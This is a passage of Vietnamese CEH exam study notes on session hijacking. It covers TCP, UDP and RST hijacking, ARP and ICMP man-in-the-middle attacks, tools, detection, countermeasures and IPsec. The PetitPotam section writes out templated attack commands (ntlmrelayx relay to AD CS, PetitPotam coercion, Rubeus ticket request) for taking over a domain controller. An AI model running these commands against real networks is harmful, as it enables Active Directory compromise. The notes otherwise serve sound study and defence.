  - Bộ nhận (server) xử lý gói giả mạo, tăng số thứ tự lên và gửi gói xác nhận (ACK) về địa chỉ IP thực của nạn nhân.
  - Máy nạn nhân không hề biết về gói giả mạo nên bỏ qua gói ACK của server và tắt bộ đếm số thứ tự. Trạng thái kết nối lúc này bị lệch/mất đồng bộ (desynchronized state).
  - Kẻ tấn công tiếp tục theo dõi số thứ tự và liên tục giả mạo các gói tin xuất phát từ IP nạn nhân.
  - Kẻ tấn công tự do giao tiếp với server trong khi kết nối thực của nạn nhân bị treo (hangs).
- **IP Spoofing: Source Routed Packets (Gói định tuyến nguồn)** [Trang 1586]:
  - Kẻ tấn công giành quyền truy cập bằng cách giả mạo (spoofs) IP của một host được tin cậy (trusted host) để server chấp nhận các gói tin.
  - Gói tin được gán nhãn định tuyến nguồn (source-routed), nghĩa là kẻ tấn công tự chỉ định đường dẫn cho gói tin đi đến IP đích.
  - Kẻ tấn công thay đổi số sequence và ACK, sau đó chèn các gói giả mạo vào phiên TCP trước khi host thực thụ kịp phản hồi server.
  - Gói thật từ host bị mất do server đã nhận gói có số thứ tự do kẻ tấn công sử dụng từ trước.
- **RST Hijacking** [Trang 1587]:
  - Kẻ tấn công tiêm một gói Reset (RST) trông có vẻ hợp lệ bằng cách sử dụng địa chỉ nguồn giả mạo và dự đoán đúng số ACK (acknowledgment number).
  - Nếu dùng đúng số ACK, nạn nhân sẽ tưởng rằng thiết bị ngang hàng (peer) đã gửi gói reset này.
  - Ngay lập tức, nạn nhân đặt lại và đóng kết nối.
  - Kỹ thuật này được thực hiện bằng các công cụ tạo gói (packet crafting tools) như Colasoft Packet Builder hoặc công cụ phân tích TCP/IP như `tcpdump`.
- **Blind Hijacking (Cướp phiên mù)** [Trang 1588]:
  - Kẻ tấn công tiêm dữ liệu độc hại hoặc lệnh (commands) vào phiên TCP ngay cả khi không thể vô hiệu hóa source-routing.
  - Kẻ tấn công có thể gửi dữ liệu nhưng không có quyền truy cập để nhìn thấy phản hồi (no access to see the response). Do không quan sát được, kẻ tấn công phải đoán chính xác Next Sequence Number (NSN) để ép server thực thi lệnh.
- **UDP Hijacking** [Trang 1589]:
  - Giao thức UDP không dùng packet sequencing (số thứ tự) hay đồng bộ hóa (connectionless), nên việc sửa đổi dữ liệu cực kỳ dễ dàng mà nạn nhân không hay biết.
  - Kẻ tấn công (đã spoof IP nguồn) gửi một reply UDP giả mạo cho các request UDP của nạn nhân trước khi server hợp lệ có thể phản hồi.
  - Có thể sử dụng tấn công MITM để chặn (intercept) hoàn toàn reply thật từ server, giúp việc chiếm phiên dễ dàng hơn.
  - **Cách thức UDP Hijacking hoạt động (How UDP Hijacking Works):**
    - **Giả mạo địa chỉ IP nguồn (Spoofing source IP address):** Vì UDP không yêu cầu quá trình bắt tay trước khi truyền dữ liệu, kẻ tấn công có thể gửi các gói UDP với địa chỉ IP nguồn giả mạo (giả vờ là một máy chủ khác).
    - **Chặn lưu lượng (Intercepting the traffic):** Kẻ tấn công gửi các gói UDP giả mạo đến máy khách hoặc máy chủ. Những gói này dường như đến từ một nguồn hợp pháp nhưng lại chứa dữ liệu hoặc hướng dẫn độc hại.
    - **Thao túng giao tiếp (Manipulating the communication):** Bằng cách chèn thông tin sai lệch vào luồng dữ liệu hoặc khởi tạo các yêu cầu trái phép, kẻ tấn công có thể thao túng hành vi của ứng dụng sử dụng lưu lượng UDP.

## 15. Tấn công MITM dùng ICMP giả mạo và ARP Spoofing [Trang 1590]

Trong cả hai kỹ thuật này, kẻ tấn công sử dụng một packet sniffer làm giao diện trung gian giữa client và server, thay đổi cổng mặc định (default gateway) của client để định tuyến lại (reroute) các gói tin qua máy của kẻ tấn công:

- **MITM using forged ICMP (Dùng ICMP giả mạo):** Giao thức ICMP vốn là phần mở rộng của IP dùng để gửi thông báo lỗi. Kẻ tấn công tạo các gói ICMP giả mạo để lừa máy client và server rằng quá trình định tuyến ban đầu có vấn đề. Từ đó, gói lỗi ICMP này đánh lừa và chuyển hướng (redirect) toàn bộ traffic giữa client và host đi qua máy của kẻ tấn công thay vì đường dẫn hợp pháp.
- **ARP spoofing:** Các máy chủ dùng bảng ARP để ánh xạ IP sang MAC. Kẻ tấn công phát sóng (broadcasting) các gói ARP request và gửi các ARP reply giả mạo để cập nhật sai lệch bảng ARP của nạn nhân. Việc này khiến lưu lượng bị đẩy đến địa chỉ MAC của kẻ tấn công thay vì IP đích hợp lệ.

## 16. PetitPotam Hijacking [Trang 1591 - 1592]

- **Khái niệm:** Là cuộc tấn công ép buộc một Domain Controller (DC) phải khởi tạo xác thực tới server của kẻ tấn công.
- **Cách thức hoạt động:** Kẻ tấn công sử dụng các lệnh gọi API của Microsoft’s Encrypting File System Remote Protocol (MS-EFSRPC) (cụ thể là lệnh `EfsRpcOpenFileRaw`) để ép buộc (coerce) quá trình xác thực. Bằng cách thao túng phiên từ một SMB Server giả mạo, kẻ tấn công lừa DC tin rằng chúng là người dùng hợp pháp để lấy được hàm băm NTLM (NTLM hash) của DC. Sau đó, kẻ tấn công chuyển tiếp (relay) xác thực NTLM này vào máy chủ Active Directory Certificate Services (AD CS) để tạo ra một chứng chỉ số. Có được chứng chỉ, kẻ tấn công chiếm ngay đặc quyền quản trị (admin-level privileges) và kiểm soát toàn bộ hạ tầng AD.
- **Các lệnh thực thi PetitPotam Hijacking:**
  - Xác định Tổ chức cấp chứng chỉ (Certificate Authority): `certutil.exe`
  - Thiết lập HTTP/SMB cấu hình (dùng Impacket) để bắt thông tin xác thực từ DC: `ntlmrelayx.py -t <URL of Certificate authority with web enrolment> -smb2support --adcs --template DomainController`
  - Ép buộc (coerce) quá trình xác thực thông qua gọi API MS-EFSRPC: `python3 PetitPotam.py -d <CA name> -u <Username> -p <Password> <Listener-IP> <IP of DC>` (Nếu DC có lỗ hổng, có thể chạy lệnh không cần credentials: `python3 PetitPotam.py <Attacker's IP> <IP of DC>`)
  - Sau khi có NTLM hash của chứng chỉ, yêu cầu vé Kerberos (dùng Rubeus) để lấy đặc quyền: `Rubeus.exe asktgt /outfile.kirbi /dc:<DC-IP> /domain: domain name /user: <Domain username> /ptt /certificate: <NTLM hashes received from above command>`

## 17. Tóm tắt dạng khai thác và Bảng Kỹ thuật [Trang 1584 - 1592]

**Tóm tắt dạng khai thác cấp mạng (Network-Level Session Hijacking):**

- **TCP Sequence Abuse (Lạm dụng số thứ tự TCP)** → TCP/IP Hijacking, Blind Hijacking, RST Hijacking.
- **Trust Abuse (Lạm dụng sự tin cậy)** → IP Spoofing (Source routing), PetitPotam.
- **Stateless Abuse (Lạm dụng giao thức không trạng thái)** → UDP Hijacking.
- **Routing Abuse (Lạm dụng định tuyến)** → ICMP Forgery.
- **LAN Poisoning (Đầu độc mạng nội bộ)** → ARP Spoofing.

**Bảng tổng hợp chi tiết:**

| Attack                           | Ý tưởng chính (1 dòng)                                      | Luồng tấn công (tóm tắt)                                                                                                                                | Yêu cầu chính                                               | CEH Exam Keywords                               |
| -------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- | ----------------------------------------------- |
| **TCP/IP Hijacking**             | Chiếm phiên TCP bằng cách gây mất đồng bộ (desync sequence) | Sniff → Gửi gói giả seq → Receiver xử lý và tăng seq → Victim bỏ qua ACK → Desynchronized → Attacker tiếp tục giả mạo.                                  | Phải chung mạng để sniff hoặc dự đoán đúng sequence number. | Sequence number prediction, desynchronization.  |
| **IP Spoofing (Source Routing)** | Mạo danh host tin cậy bằng địa chỉ IP giả                   | Attacker giả IP host tin cậy → Chèn gói giả (dùng source-routing) trước khi host thật phản hồi → Server chấp nhận gói của attacker, mất gói của victim. | Bật Source routing + biết IP của Trusted host.              | Trusted host abuse, source routed packets.      |
| **RST Hijacking**                | Ép đóng phiên TCP bằng gói Reset                            | Tiêm gói RST nhìn có vẻ hợp lệ (spoofed IP + đúng ACK number) → Peer tưởng victim gửi reset → Phiên bị ngắt.                                            | Biết chính xác số Sequence/ACK.                             | TCP RST flag, forced reset, packet crafting.    |
| **Blind Hijacking**              | Tiêm dữ liệu khi không nhìn thấy phản hồi                   | Attacker không có quyền sniff để xem reply → Đoán NSN (Next Sequence Number) → Tiêm dữ liệu/lệnh vào TCP session một cách mù quáng.                     | Số Sequence dễ đoán.                                        | Blind injection, predict NSN.                   |
| **UDP Hijacking**                | Thay thế hoặc tiêm giao tiếp UDP                            | Gửi UDP reply giả mạo trước khi server thật kịp phản hồi → Hoặc dùng MITM để chặn hẳn reply thật.                                                       | Do UDP không trạng thái (stateless/connectionless).         | Packet spoofing, no packet sequencing.          |
| **MITM using Forged ICMP**       | Dùng thông báo lỗi ICMP giả để chuyển hướng traffic         | Gửi thông báo lỗi ICMP giả → Đánh lừa client/server định tuyến luồng dữ liệu qua máy của attacker.                                                      | Hệ thống tin vào ICMP error messages.                       | ICMP redirect, forged error messages.           |
| **ARP Spoofing**                 | Đầu độc ARP cache để chặn và điều hướng traffic             | Gửi ARP reply giả mạo → Cập nhật sai MAC của victims → Traffic định tuyến qua attacker.                                                                 | Cần truy cập mạng nội bộ (LAN).                             | ARP poisoning, broadcast ARP request.           |
| **PetitPotam Hijacking**         | Ép DC xác thực NTLM rồi Relay để lấy quyền                  | Lạm dụng API MS-EFSRPC → Ép DC authenticate về máy attacker → Relay NTLM hash sang AD CS → Chiếm trọn quyền Admin.                                      | NTLM đang bật + hạ tầng AD CS tồn tại.                      | Authentication coercion, NTLM relay, MS-EFSRPC. |

## 18. Công cụ cướp phiên (Session Hijacking Tools) [Trang 1593 - 1596]

- **Hetty** [Trang 1593 - 1594]: Là một HTTP toolkit dành cho nghiên cứu bảo mật. Tính năng chính bao gồm thực hiện tấn công MITM HTTP proxy kèm ghi log và tìm kiếm nâng cao, cung cấp HTTP client để tạo và phát lại (replay) các proxy request.
- **Caido** [Trang 1593 - 1594]: Web security auditing toolkit giúp chuyên gia bảo mật chặn (intercept) và xem các HTTP request theo thời gian thực khi duyệt web. Có thể sửa đổi request đến bằng Regex, test với các wordlist lớn.
- **bettercap** [Trang 1593, 1595 - 1596]: Framework linh hoạt viết bằng ngôn ngữ Go. Hỗ trợ MITM, trinh sát và tấn công mạnh mẽ trên các mạng WiFi, Bluetooth Low Energy (BLE), thiết bị HID không dây và cả mạng IPv4/IPv6.
- _(Bổ sung từ nguồn)_ Các công cụ khác: **OWASP ZAP**, **WebSploit Framework**, **sslstrip**, **Burp Suite**, **JHijack**.

## 19. Phương pháp phát hiện Cướp phiên (Methods to detect session hijacking) [Trang 1598]

- **Các triệu chứng của một cuộc tấn công cướp phiên (Symptoms of a session hijacking attack)** [Trang 1597]:
  - Sự bùng nổ hoạt động mạng (A burst of network activity) diễn ra trong một khoảng thời gian, làm giảm hiệu suất của hệ thống.
  - Máy chủ trở nên quá tải (Busy servers) do phải xử lý lượng lớn yêu cầu được gửi đến từ cả máy khách hợp pháp và kẻ chiếm quyền.
- **Phương pháp Thủ công (Manual Method):** Sử dụng các phần mềm bắt gói tin (như Wireshark, SteelCentral Packet Analyzer) để giám sát traffic và tìm kiếm các dấu hiệu bất thường.
- **Ép buộc Mục nhập ARP (Forced ARP Entry):** Thay thế địa chỉ MAC của máy bị xâm nhập bằng một MAC khác trong bộ nhớ đệm ARP của máy chủ để hạn chế lưu lượng mạng đến máy đó. Kỹ thuật này thường được áp dụng khi phát hiện: Cập nhật ARP lặp đi lặp lại (Repeated ARP updates), Các khung truyền mang địa chỉ MAC khác nhau, hoặc Bão ACK (ACK storms).
- **Phương pháp Tự động (Automatic Method):** Sử dụng các hệ thống Phát hiện Xâm nhập (IDS) và Ngăn ngừa Xâm nhập (IPS) để đối chiếu gói tin mạng với cơ sở dữ liệu chữ ký tấn công.

## 20. Công cụ phát hiện cướp phiên (Session Hijacking Detection Tools) [Trang 1603 - 1605]

Các cuộc tấn công cướp phiên thường diễn ra âm thầm, giảm hiệu suất hệ thống. Việc phát hiện có thể sử dụng packet sniffers, IDSs và SIEM.

- **USM Anywhere** [Trang 1603 - 1604]: Cung cấp khả năng phát hiện mối đe dọa mạnh mẽ, quản lý SIEM và log, phản hồi sự cố trên cả đám mây (cloud), on-premises và môi trường hybrid.
- **Wireshark** [Trang 1603 - 1605]: Công cụ cho phép bắt và duyệt traffic mạng tương tác. Dùng Winpcap để bắt gói tin trực tiếp từ các mạng Ethernet, IEEE 802.11, Token Ring, Bluetooth... giúp phát hiện hoạt động cướp phiên.
- _(Bổ sung từ nguồn)_ Các công cụ khác: **Quantum Intrusion Prevention System (IPS)**, **SolarWinds Security Event Manager**, **IBM Security Network Intrusion Prevention System**, **LogRhythm**.

## 21. Ngăn chặn cướp phiên (Session Hijacking Countermeasures) [Trang 1606 - 1607, 1616 - 1618]

- **Các nguyên tắc bảo vệ chung (General Guidelines):**
  - Sử dụng chuỗi dài hoặc số ngẫu nhiên lớn làm session keys.
  - Triển khai cơ chế Đăng xuất (log-out) và Hết hạn phiên (timeout) tự động.
  - Sử dụng các giải pháp IDS hoặc phần mềm ARPwatch để giám sát chống ARP Cache Poisoning.
  - Sử dụng SFTP, FTPS, AS2 có hỗ trợ mã hóa và chứng chỉ số thay vì FTP. Tắt cơ chế nén HTTP (tránh CRIME attack).
  - Chuyển đổi các mô hình mạng Hub cũ sang Switch.
  - **Các nguyên tắc bảo vệ chung bổ sung** [Trang 1599 - 1601]:
    - Tránh đưa Session ID vào URL hoặc query string.
    - Đảm bảo phần mềm bảo vệ ở cả phía client và phía server luôn ở trạng thái hoạt động và được cập nhật mới nhất.
    - Cấu hình các quy tắc chống giả mạo (spoof rules) nội bộ và bên ngoài phù hợp trên gateway.
    - Cập nhật thường xuyên các bản vá nền tảng để khắc phục lỗ hổng TCP/IP (ví dụ: chuỗi gói tin có thể đoán được).
    - Sử dụng các giao thức mã hóa có sẵn trong bộ OpenSSH.
    - Sử dụng giải pháp dựa trên Microsoft (SMB signing) để kích hoạt chữ ký lưu lượng (traffic signing).
    - Sử dụng xác thực đa yếu tố (MFA).
    - Giám sát hoạt động của phiên để tìm các mẫu bất thường, chẳng hạn như có nhiều lần đăng nhập đồng thời từ các vị trí địa lý khác nhau.
    - Ràng buộc (bind) phiên với địa chỉ IP của người dùng.
    - Tận dụng sinh trắc học hành vi (behavioral biometrics) như nhịp gõ phím, di chuyển chuột và các mẫu điều hướng để xác thực liên tục.
    - Triển khai cơ chế challenge-response (ví dụ: CAPTCHA) khi phát hiện hoạt động đáng ngờ.
    - Áp dụng thời gian hết hạn tuyệt đối (absolute timeout) bất kể người dùng có đang hoạt động hay không.
- **Hướng dẫn cho Nhà phát triển Web (Web Development Guidelines):**
  - Tái tạo (Regenerate) Session ID mới ngay sau khi người dùng đăng nhập thành công (Chống Session Fixation).
  - Mã hóa dữ liệu và session key truyền tải giữa người dùng và máy chủ (Sử dụng SSL/TLS).
  - Giảm tuổi thọ (life span) của session hoặc cookie.
  - Sử dụng các chỉ thị HTTP Headers nghiêm ngặt: `Cache-Control: no-cache, no-store` và `Pragma: no-cache`.
  - Đảm bảo thuộc tính `HTTPOnly` và `Secure` flag khi gửi cookies để tránh bị kịch bản phía máy khách (như XSS) trích xuất.
  - Xác minh IP và User-Agent của request hiện tại xem có khớp với nguồn tạo phiên ban đầu không.
  - Sử dụng thuộc tính `SameSite` cookie để ngăn trình duyệt gửi cookies trong các request chéo trang (Chống CSRF).
  - **Hướng dẫn cho Nhà phát triển Web bổ sung** [Trang 1601 - 1602]:
    - Không tạo phiên cho người dùng chưa được xác thực trừ khi thật sự cần thiết.
    - Triển khai xác minh thiết bị liên tục (continuous device verification) để xác định xem người dùng thiết lập phiên có còn quyền kiểm soát hay không.
    - Triển khai xác thực dựa trên rủi ro (risk-based authentication) ở các cấp độ khác nhau trước khi cấp quyền truy cập vào thông tin nhạy cảm.
    - Hủy các phiên được liên kết ngay trên máy chủ (server-side) thay vì chỉ phụ thuộc vào thời gian hết hạn phiên khi người dùng hủy xác thực.
    - Đảm bảo ứng dụng web có thể chuyển hướng các yêu cầu HTTP sang HTTPS bằng cài đặt máy chủ hoặc kỹ thuật chuyển hướng.
    - Bắt buộc yêu cầu xác thực lại (re-authentication) và tạo phiên mới trước khi cho phép người dùng thực hiện các chức năng nhạy cảm.
    - Dựa vào các web frameworks cung cấp Session ID bảo mật cao thay vì tự xây dựng cơ chế quản lý phiên riêng.
    - Bắt buộc sử dụng HTTPS trên tất cả các trang của ứng dụng web, không chỉ riêng trang đăng nhập.
- **Hướng dẫn cho Người dùng Web (Web User Guidelines):**
  - Không nhấp vào link lạ trong email, luôn sử dụng HTTPS khi nhập dữ liệu nhạy cảm.
  - Sử dụng nút Log-out thay vì chỉ nhấn dấu "X" để đóng trình duyệt.
  - Xóa bộ nhớ đệm (history, offline content, cookies) ngay sau mỗi phiên giao dịch quan trọng.
  - Vô hiệu hóa tính năng tự động kết nối Wi-Fi mở (Disable auto-connect) và tránh giao dịch tài chính trên Wi-Fi công cộng. Tránh lưu mật khẩu trên trình duyệt.
  - **Hướng dẫn cho Người dùng Web bổ sung** [Trang 1602]:
    - Đảm bảo trang web được chứng nhận bởi các Tổ chức cấp chứng chỉ (CA) phù hợp.
    - Xác minh và vô hiệu hóa các tiện ích bổ sung (add-ons) từ các trang web không đáng tin cậy. Chỉ bật add-ons khi thực sự cần thiết.
    - Thực hành sử dụng mật khẩu dùng một lần (OTP) cho các giao dịch dữ liệu quan trọng (ví dụ: thẻ tín dụng).
    - Thường xuyên cập nhật cơ sở dữ liệu chữ ký diệt virus (anti-virus signatures) để ngăn chặn việc tự động cài đặt malware đánh cắp cookie.
    - Đảm bảo hệ điều hành, trình duyệt web và các plugin đã cài đặt luôn được cập nhật.
    - Sử dụng các dịch vụ email và nhắn tin được mã hóa để liên lạc thông tin nhạy cảm.
    - Thận trọng khi cấp cho các ứng dụng quyền truy cập vào thông tin hoặc tính năng nhạy cảm trên thiết bị di động.
    - Sử dụng các trình xử lý phiên tùy chỉnh (custom session handlers) để lưu trữ và xử lý token phiên.

- **HTTP Strict Transport Security (HSTS)** [Trang 1606]: Chính sách bảo mật web bảo vệ khỏi MITM. HSTS ép buộc trình duyệt web chỉ giao tiếp với máy chủ bằng giao thức HTTPS an toàn, tự động chuyển đổi các kết nối HTTP không an toàn thành HTTPS.
- **Token Binding** [Trang 1606 - 1607]: Client tạo ra một cặp khóa public-private cho kết nối. Khi gắn Session ID (token) vào kết nối, client ký nó bằng khóa private. Ngay cả khi kẻ tấn công bắt được token, chúng không thể phát lại (reuse) nó cho một kết nối khác vì không có khóa private tương ứng.
  - **Chi tiết cơ chế Token Binding:** Client tạo ra một cặp khóa công khai-bí mật (public-private key pair) cho mỗi kết nối đến máy chủ từ xa. Khi client kết nối với máy chủ, nó tạo ra một chữ ký (signature) bằng cách sử dụng khóa bí mật và gửi chữ ký này cùng với khóa công khai của nó cho máy chủ. Máy chủ xác minh chữ ký bằng khóa công khai của client. Điều này đảm bảo rằng thông điệp được gửi bởi một client xác thực vì chỉ có client đó mới sở hữu khóa bí mật tương ứng. Ngay cả khi kẻ tấn công bắt được chữ ký, chúng cũng không thể tái tạo lại chữ ký hoặc sử dụng lại nó cho một kết nối khác. Đối với mỗi kết nối mới, một cặp khóa công khai-bí mật mới sẽ được tạo và sử dụng.
- **Công cụ hỗ trợ ngăn chặn (Prevention Tools)** [Trang 1616 - 1618]:
  - **Checkmarx One (SAST):** Công cụ phân tích mã nguồn tĩnh (Source-code analysis solution) giúp phát hiện và sửa các lỗ hổng kỹ thuật, lỗi logic mã nguồn mở (CxOSA) từ sớm để chống cướp phiên.
  - **Fiddler:** Web debugging proxy ghi lại toàn bộ traffic HTTP(S), cho phép giải mã HTTPS và thao túng request bằng kỹ thuật giải mã MITM để debug và pentest.
  - _(Bổ sung từ nguồn)_ Các công cụ khác: **Nessus**, **Invicti**, **Wapiti**.

## 22. Phương pháp ngăn MITM (Approaches to Prevent MITM Attacks) [Trang 1608 - 1610]

Để chống lại MITM, quản trị viên áp dụng các giải pháp sau:

- **DNS over HTTPS (DoH):** Phiên bản nâng cao của DNS giúp chống snooping. DoH gửi các truy vấn web và traffic thông qua đường hầm HTTPS mã hóa ở cổng 443, đồng thời chỉ gửi một phần domain name đủ để lấy kết quả (thay vì toàn bộ domain name).
- **WPA3:** Giao thức không dây mạnh mẽ giúp ngăn kẻ tấn công brute-force mật khẩu để tham gia vào mạng thực hiện MITM.
- **VPN:** Tạo subnet và thiết lập các đường hầm mã hóa (encrypted tunnels) dựa trên khóa bí mật (key-based) qua mạng công cộng, ngăn kẻ tấn công giải mã dữ liệu.
- **Xác thực hai yếu tố (2FA):** Cung cấp thêm một vector bảo vệ bên cạnh mật khẩu, chống lại brute-forcing và hijacking.
- **Password Manager (Trình quản lý mật khẩu):** Ứng dụng giúp lưu trữ mật khẩu phức tạp ở vị trí an toàn, được đóng gói bởi một "master key".
- **Zero-trust architecture (Nguyên tắc Zero-trust):** Nguyên tắc "Trust but verify", yêu cầu tất cả người dùng (bất kể ở trong hay ngoài mạng nội bộ) đều phải được xác thực nghiêm ngặt trước khi cấp quyền truy cập tài nguyên.
- **PKI và quản lý chứng chỉ:** Sử dụng Public Key Infrastructure cùng các Tổ chức cấp chứng chỉ (CAs) uy tín để xác minh danh tính kỹ thuật số.
- **Phân đoạn mạng (Network segmentation):** Chia nhỏ mạng để hạn chế phạm vi di chuyển ngang (lateral movement) của kẻ tấn công và giới hạn khả năng chặn luồng liên lạc.

## 23. Giao thức IPsec và các Modes [Trang 1611 - 1615]

IPsec (Internet Protocol Security) là bộ giao thức của IETF giúp bảo vệ IP communications bằng cách xác thực và mã hóa từng gói IP, rất phổ biến cho VPN. Bao gồm 2 chế độ chính:

- **Transport Mode (Chế độ truyền tải)** [Trang 1613]: Chỉ mã hóa (và/hoặc xác thực) phần payload (dữ liệu) của gói IP, để nguyên phần header IP không mã hóa. Thường dùng cho liên lạc trực tiếp end-to-end giữa 2 host. Tương thích với NAT.
- **Tunnel Mode (Chế độ đường hầm)** [Trang 1614]: Đóng gói và mã hóa toàn bộ gói IP gốc (gồm cả IP header và payload), sau đó biến nó thành payload cho một gói IP mới (với IP header mới). Có bảo mật cao hơn Transport mode, thường dùng tạo VPN giữa 2 routers (gateways) hoặc host-to-gateway.
- **Các dịch vụ bảo mật do IPsec cung cấp (Security services offered by IPsec):**
  - Từ chối các gói tin bị phát lại (Rejection of replayed packets - một hình thức bảo toàn tính toàn vẹn một phần số thứ tự).
  - Bảo mật dữ liệu / Mã hóa (Data confidentiality).
  - Kiểm soát truy cập (Access control).
  - Tính toàn vẹn không kết nối (Connectionless integrity).
  - Xác thực nguồn gốc dữ liệu (Data origin authentication).
  - Tính toàn vẹn dữ liệu (Data integrity).
  - Bảo mật luồng lưu lượng giới hạn (Limited traffic-flow confidentiality).
  - Xác thực ngang hàng cấp mạng (Network-level peer authentication).
  - Bảo vệ chống phát lại (Replay protection).
- _(Bổ sung từ nguồn)_ **Kiến trúc IPsec** [Trang 1611, 1614 - 1615]: Sử dụng hai giao thức cốt lõi:
  - **AH (Authentication Header):** Chỉ cung cấp xác thực nguồn gốc và tính toàn vẹn (integrity), chống replay, không hỗ trợ mã hóa (no confidentiality).
  - **ESP (Encapsulating Security Payload):** Cung cấp đầy đủ cả xác thực, tính toàn vẹn và tính bảo mật (mã hóa/encryption). Đóng vai trò thiết yếu trong việc bảo vệ payload của dữ liệu.
- **Các thành phần của cấu trúc IPsec (Components of IPsec)** [Trang 1612 - 1614]:
  - **IPsec driver:** Phần mềm thực hiện chức năng mã hóa/giải mã ở cấp độ giao thức.
  - **Internet Key Exchange (IKE):** Giao thức tạo khóa bảo mật.
  - **Internet Security Association and Key Management Protocol (ISAKMP):** Phần mềm kết hợp các khái niệm xác thực, quản lý khóa và liên kết bảo mật (SA) để hai máy tính có thể mã hóa dữ liệu giao tiếp với nhau.
  - **Oakley:** Giao thức sử dụng thuật toán Diffie-Hellman để tạo master key và khóa đặc thù cho từng phiên.
  - **IPsec Policy Agent:** Dịch vụ trong Windows HĐH nhằm thực thi các chính sách IPsec.
  - **IPsec Domain of Interpretation (DOI)** [Trang 1615]: Xác định định dạng payload, loại trao đổi và quy ước đặt tên cho thông tin bảo mật (chẳng hạn như thuật toán mã hóa hoặc chính sách bảo mật). IPsec DOI khởi tạo ISAKMP để sử dụng với IP khi IP dùng ISAKMP để đàm phán các liên kết bảo mật.
  - **Policy (Chính sách)** [Trang 1615]: Các chính sách IPsec rất hữu ích trong việc cung cấp an ninh mạng. Chúng xác định khi nào và cách thức bảo mật dữ liệu, cũng như các phương pháp bảo mật sẽ sử dụng ở các cấp độ khác nhau trong mạng (system, domain, site, organizational unit...).
- **Các bước tham gia vào quy trình IPsec (Steps involved in the IPsec process):**
  1. Người dùng (consumer) gửi một thông điệp đến nhà cung cấp dịch vụ (service provider).
  2. IPsec driver của người dùng cố gắng khớp địa chỉ của gói tin gửi đi hoặc loại gói tin với bộ lọc IP.
  3. IPsec driver thông báo cho ISAKMP để bắt đầu đàm phán bảo mật với nhà cung cấp dịch vụ.
  4. ISAKMP của nhà cung cấp dịch vụ nhận được yêu cầu đàm phán bảo mật.
  5. Cả hai bên bắt đầu trao đổi khóa, thiết lập Liên kết bảo mật ISAKMP (ISAKMP SA) và một khóa bí mật dùng chung.
  6. Cả hai bên thảo luận về mức độ bảo mật cho việc trao đổi thông tin, thiết lập cả IPsec SA và khóa.
  7. IPsec driver của người dùng chuyển các gói tin đến loại kết nối thích hợp để truyền tới nhà cung cấp dịch vụ.
  8. Nhà cung cấp nhận được các gói tin và chuyển chúng cho IPsec driver của họ.
  9. IPsec của nhà cung cấp sử dụng SA gửi đến (inbound SA) và khóa để kiểm tra chữ ký số và bắt đầu giải mã.
  10. IPsec driver của nhà cung cấp chuyển các gói đã giải mã đến tầng transport của mô hình OSI để xử lý tiếp.
